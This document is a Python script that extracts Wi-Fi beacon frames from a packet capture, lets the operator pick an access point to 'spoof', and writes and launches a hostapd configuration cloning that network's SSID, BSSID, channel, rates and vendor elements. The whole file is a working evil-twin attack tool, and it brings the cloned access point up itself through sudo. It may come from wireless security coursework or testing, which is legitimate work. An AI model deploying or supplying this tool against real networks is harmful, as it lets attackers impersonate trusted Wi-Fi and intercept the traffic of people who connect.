from scapy.layers.dot11 import *
from scapy.sendrecv import sniff
import chardet
import hashlib
import sys
import os


dict_beacon= {}
def parse(frame):
    if frame.haslayer(Dot11) and frame.type==0 and frame.subtype==8 and (frame.info).decode('utf-8') not in dict_beacon:
        ssid=(frame.info).decode()
        dict_beacon[ssid] = frame


def ap_creation(frame):
   """Creation of a hostapd.conf file"""
   
   with open("hostapd.conf", "w") as f:
      f.write("interface="+interface+"\n")
      f.write("driver=nl80211\n")
      f.write("ssid="+(frame.info).decode()+"\n")
      f.write("channel="+str(frame.channel)+"\n")
      f.write("hw_mode=g\n")
      f.write("bssid="+frame.addr3+"\n")

      list_rates = " ".join(str((i%128)*5) for i in frame[Dot11Elt].rates) 
      f.write("supported_rates="+ list_rates +"\n")

      if "preamble" in str(frame[Dot11Beacon].cap):
            f.write("preamble=1\n")

      if frame.haslayer(Dot11EltCountry):
         country=(frame[Dot11EltCountry].country_string).decode('utf-8')
         f.write("country_code="+country.rstrip()+"\n")
         f.write("ieee80211d=1\n")
     
      if frame.haslayer(Dot11EltHTCapabilities):
         htmax=frame[Dot11EltHTCapabilities].Max_A_MSDU
         f.write("ieee80211n=1\n")
         if htmax:
            f.write("ht_capab=[MAX-AMSDU-7935]\n")
         else: 
            f.write("ht_capab=[MAX-AMSDU-3839]\n")

      if frame.haslayer(Dot11EltVendorSpecific):
            try:
               tmp = (frame[0][Dot11EltVendorSpecific][1].info).hex()
               len = frame[0][Dot11EltVendorSpecific][1].len
               vds = "dd" + '{:02x}'.format(len) + tmp
               f.write("vendor_elements="+ vds+"\n")
            except:
               pass

      # detect if there is WPA2
      if "privacy" in str(frame.getlayer(Dot11Beacon).cap):
         passphrase = input("Wpa2 passphrase : ")
         f.write("wpa=1\n")
         f.write("wpa_passphrase="+passphrase+"\n")
         f.write("wpa_key_mgmt=WPA-PSK\n")
         f.write("wpa_pairwise=CCMP\n")
         f.write("rsn_pairwise=CCMP\n")

   os.system("sudo hostapd hostapd.conf")



file=sys.argv[1]
interface=sys.argv[2]
sniff(offline=file, prn=parse)


choice = []
for i, ssid in enumerate(dict_beacon):
   print(i, ssid)
   choice.append(ssid)
nbr = int(input("Which AP you want to spoof :"))

frame2 = dict_beacon[choice[nbr]]
ap_creation(frame2)

